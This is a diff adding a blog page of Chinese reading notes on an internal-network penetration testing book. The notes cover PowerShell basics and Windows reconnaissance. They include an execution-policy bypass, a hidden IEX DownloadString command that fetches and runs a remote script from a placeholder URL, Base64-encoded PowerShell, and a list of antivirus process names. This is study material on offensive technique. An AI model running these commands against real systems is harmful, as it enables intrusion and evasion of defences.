@@ -1,0 +1,3212 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Drunkmars">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Drunkmars">
+    
+        <meta name="keywords" content="Drunkmars,Drunkmars-theme,Drunkmars-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="第一章 内网渗透测试基础Windows Powershell基础查看Powershell版本 12Get-Host$PSVersionTable.PSVERSION     执行策略： 在限制了Powershell不能使用时可以使用此方式进行设置允许执行Powershell脚本 1Set-ExecutionPolicy Unrestricted     策略共四种: 1234Restricted：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="读书笔记">
+<meta property="og:url" content="http://example.com/2021/05/29/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Drunkmars">
+<meta property="og:description" content="第一章 内网渗透测试基础Windows Powershell基础查看Powershell版本 12Get-Host$PSVersionTable.PSVERSION     执行策略： 在限制了Powershell不能使用时可以使用此方式进行设置允许执行Powershell脚本 1Set-ExecutionPolicy Unrestricted     策略共四种: 1234Restricted：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529204952043.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529205326051.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580196795644.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580196855685.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210031404.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210054665.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210126963.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210305674.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210435205.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210450843.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210515437.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210606354.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529211326956.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580439953824.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580441837968.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580441964422.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580471889196.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580472485753.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580477640354.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580525380729.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580632072058.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580632105280.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580633439725.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580634150155.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580634645757.png">
+<meta property="og:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580634734506.png">
+<meta property="article:published_time" content="2021-05-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-05-29T19:59:41.805Z">
+<meta property="article:author" content="Drunkmars">
+<meta property="article:tag" content="private">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529204952043.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>读书笔记 · Drunkmars&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Drunkmars's Blog</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Drunkmars&#39;s Blog</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">读书笔记</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                读书笔记
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="private">private</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">6k</span>阅读时长: <span class="post-count reading-time">26 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2021/05/29</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="第一章-内网渗透测试基础"><a href="#第一章-内网渗透测试基础" class="headerlink" title="第一章 内网渗透测试基础"></a>第一章 内网渗透测试基础</h1><h2 id="Windows-Powershell基础"><a href="#Windows-Powershell基础" class="headerlink" title="Windows Powershell基础"></a>Windows Powershell基础</h2><p>查看Powershell版本</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Host</span></span><br><span class="line"><span class="variable">$PSVersionTable</span>.PSVERSION</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529204952043.png" alt="image-20210529204952043"></p>
+<p>执行策略：</p>
+<p>在限制了Powershell不能使用时可以使用此方式进行设置允许执行Powershell脚本</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529205326051.png" alt="image-20210529205326051"></p>
+<p>策略共四种:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Restricted：脚本不能运行</span><br><span class="line">RemoteSigned：本地可以运行</span><br><span class="line">AllSigned：仅当脚本由受信任的发布者签名时才能运行</span><br><span class="line">Unrestricted：允许所有脚本允许</span><br></pre></td></tr></table></figure>
+
+
+
+<p>附加：</p>
+<p>原文中提到运行脚本，可以使用.\a.ps1</p>
+<p>如果是使用Import-Module加载脚本可以使用：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\a.ps1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-process p* | stop-process</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">新建目录：New-Item aaa -ItemType Directory（实际上在5.0版本可以直接通过md）</span><br><span class="line">新建文件:New-Item aaa.txt</span><br><span class="line">删除目录：Remove-Item aaa.txt可以直接使用rm</span><br><span class="line">显示文件内容：Get-Content可以直接使用cat</span><br><span class="line">设置文本内容：Set-Content aaa.txt -Value &quot;aaa&quot;</span><br><span class="line">追加内容:Add-Content aaa.txt -Value &quot;aaa&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕过本地权限执行"><a href="#绕过本地权限执行" class="headerlink" title="绕过本地权限执行"></a>绕过本地权限执行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="operator">-File</span> PowerUp.ps1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>上传之后执行：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;Import-module C:\PowerUp.ps1;Invoke-AllChecks&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>远程加载(此处原书中存在空格被吞的情况)：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-WindowsStyle</span> <span class="keyword">Hidden</span> <span class="literal">-NoProfile</span> <span class="literal">-NonI</span> <span class="built_in">IEX</span>(<span class="built_in">New-ObjectNet</span>.WebClient).DownloadString(<span class="string">&quot;http://www.baidu.com/xxx.ps1&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用Base64编码对Powershell命令进行编码：</p>
+<p>使用ps_encoder.py脚本加密（<a target="_blank" rel="noopener" href="https://github.com/h4sh5/ps_encoder%EF%BC%89%EF%BC%9A">https://github.com/h4sh5/ps_encoder）：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ps_encoder.py -s script.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580196795644.png" alt="1580196795644"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -encodedCommand YwBhAGwAYwAuAGUAeABlAAoA</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580196855685.png" alt="1580196855685"></p>
+<h1 id="第二章-内网信息收集"><a href="#第二章-内网信息收集" class="headerlink" title="第二章 内网信息收集"></a>第二章 内网信息收集</h1><h2 id="2-1-收集本机信息"><a href="#2-1-收集本机信息" class="headerlink" title="2.1 收集本机信息"></a>2.1 收集本机信息</h2><h3 id="1-查询网络配置命令"><a href="#1-查询网络配置命令" class="headerlink" title="1.查询网络配置命令"></a>1.查询网络配置命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-查询操作系统及软件的信息"><a href="#2-查询操作系统及软件的信息" class="headerlink" title="2.查询操作系统及软件的信息"></a>2.查询操作系统及软件的信息</h3><p>1）查看操作系统和版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">//适用于英文的操作系统，中文的：</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210031404.png" alt="image-20210529210031404"></p>
+<p>2）查看系统体系结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210054665.png" alt="image-20210529210054665"></p>
+<ol start="3">
+<li>查看安装的软件及版本、路径等</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210126963.png" alt="image-20210529210126963"></p>
+<p>Powershell版本：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-查询本机服务信息"><a href="#3-查询本机服务信息" class="headerlink" title="3.查询本机服务信息"></a>3.查询本机服务信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210305674.png" alt="image-20210529210305674"></p>
+<h3 id="4-查询进程列表"><a href="#4-查询进程列表" class="headerlink" title="4.查询进程列表"></a>4.查询进程列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br><span class="line"></span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210435205.png" alt="image-20210529210435205"></p>
+<h4 id="常见杀毒软件进程"><a href="#常见杀毒软件进程" class="headerlink" title="常见杀毒软件进程"></a>常见杀毒软件进程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">360sd.exe</span><br><span class="line">360tray.exe</span><br><span class="line">ZhuDongFangYu.exe</span><br><span class="line">KSafeTray.exe</span><br><span class="line">SafeDogUpdateCenter.exe</span><br><span class="line">McAfee McShield.exe</span><br><span class="line">egui.exe //NOD32</span><br><span class="line">AVP.EXE  //卡巴斯基</span><br><span class="line">avguard.exe		//小红伞</span><br><span class="line">bdagent.exe		//BitDefender</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-查看启动程序信息"><a href="#5-查看启动程序信息" class="headerlink" title="5.查看启动程序信息"></a>5.查看启动程序信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210450843.png" alt="image-20210529210450843"></p>
+<h3 id="6-查看计划任务"><a href="#6-查看计划任务" class="headerlink" title="6.查看计划任务"></a>6.查看计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210515437.png" alt="image-20210529210515437"></p>
+<h3 id="7-查看主机开机时间"><a href="#7-查看主机开机时间" class="headerlink" title="7.查看主机开机时间"></a>7.查看主机开机时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image-20210529210606354.png" alt="image-20210529210606354"></p>
+<h3 id="8-查询用户列表"><a href="#8-查询用户列表" class="headerlink" title="8.查询用户列表"></a>8.查询用户列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br><span class="line"></span><br><span class="line">//获取本地管理员组成员</span><br><span class="line"></span><br><span class="line">net localgroup adinistrators</span><br><span class="line"></span><br><span class="line">//查看当前再线用户</span><br><span class="line"></span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="9-列出或断开本地计算机与所连接的客户端之间的会话"><a href="#9-列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="9.列出或断开本地计算机与所连接的客户端之间的会话"></a>9.列出或断开本地计算机与所连接的客户端之间的会话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="10-查询端口列表"><a href="#10-查询端口列表" class="headerlink" title="10.查询端口列表"></a>10.查询端口列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+
+
